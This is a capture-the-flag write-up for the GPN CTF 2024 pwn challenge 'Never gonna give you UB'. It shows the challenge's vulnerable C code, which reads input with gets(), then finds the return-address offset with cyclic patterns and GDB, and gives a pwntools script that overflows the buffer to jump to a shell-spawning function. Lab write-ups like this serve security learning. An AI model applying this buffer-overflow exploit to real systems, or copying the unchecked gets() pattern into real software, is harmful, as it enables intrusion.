---
layout: load_md
title: The White Circle | Gpnctf 2024 | Never gonna give you UB Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Gpnctf 2024
parent: gpnctf_2024
category: pwn
challenge: Never gonna give you UB
tags: "pwn, ava, win function, pwntools"
date: 2024-06-02T00:00:00+00:00
last_modified_at: 2024-06-02T00:00:00+00:00
---

<h1 class="heading card-title white-text">Gpnctf 2024</h1>

## Never gonna give you UB
> Solved by : iamavu

We are given a file called `song_rater` amongst other files (Dockerfile and such) with the following security mitigations.

![](https://i.imgur.com/JYzn83H.png)


as there is no PIE, this should be easily solvable as there won’t be random address loading for binary everytime we run the binary, yay!
When we run the binary we get the following

![](https://i.imgur.com/KvLHIve.png)


So it just prints whatever input we get. 

We are also given the C code for the binary, making our job much easier.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// win or flag function which we have to execute somehow for us getting the shell
void scratched_record() {
        printf("Oh no, your record seems scratched :(\n");
        printf("Here's a shell, maybe you can fix it:\n");
        execve("/bin/sh", NULL, NULL);
}

extern char *gets(char *s);

//main function which asks for input without checking input size (gets is security flaw here)
int main() {
        printf("Song rater v0.1\n");
        char buf[0xff];
        printf("Please enter your song:\n");
        gets(buf);
        printf("\"%s\" is an excellent choice!\n", buf);
        return 0;
}
```

I have added comments where necessary, now lets have a look at binary in GDB to find the address of `RIP` so we can put the address of `scratched_record` there and get our flag.


![](https://i.imgur.com/1vmdIB9.png)


We observe that the address of `scratched_record` is `0x0000000000401196`, so we need to somehow put that address in `RIP` instruction pointer.
Let’s buffer overflow!!
We will get big buffer of 300 bytes and see how the program behaves and see which byte ends up in `RBP` .

![](https://i.imgur.com/qpSNWTo.png)


We did `pwn cyclic 300` to get 300 bytes which have certain pattern, and now we will send this as input to program and make it crash.
Why 300? well `0xff` in decimal is `255` so 300 sound pretty good to me.

![](https://i.imgur.com/ZsNFR3a.png)


After crashing the program we see that the byte `haaaaaab` gets into RBP, let’s see how much bytes that is by doing `cyclic -l haaaaaab`

![](https://i.imgur.com/UT4iqsl.png)


We found the offset at 256, now we need to add 8 into that so we get the offset where `RIP` is!
and that is `264`. yay!
Let’s write a simple pwntools script to exploit this now

```python
from pwn import *
win = p64(0x0000000000401196)
overwrite = b"A"*264
payload = overwrite + win
p = process("./song_rater")
p.sendline(payload)
p.interactive()
```

We simply pack the address of `scatched_record` in `win` variable and overwrite `264` bytes and then send that payload to the program and then get an interactive shell!

Let’s run this

![](https://i.imgur.com/2icIWVR.png)


we got the shell!

